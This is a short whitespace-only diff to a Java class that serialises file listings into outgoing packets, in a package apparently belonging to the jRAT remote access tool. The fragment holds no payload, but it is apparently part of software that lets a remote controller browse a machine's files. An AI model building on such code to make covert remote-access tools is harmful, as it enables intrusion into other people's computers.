@@ -7,7 +7,6 @@ import java.util.Date;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet19ListFiles extends AbstractOutgoingPacket {
 
 	private File[] files;
@@ -19,7 +18,7 @@ public class Packet19ListFiles extends AbstractOutgoingPacket {
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
 		dos.writeInt(files == null ? 0 : files.length);
-		
+
 		for (int i = 0; i < (files == null ? 0 : files.length); i++) {
 			File file = files[i];
 			if (file.isDirectory()) {
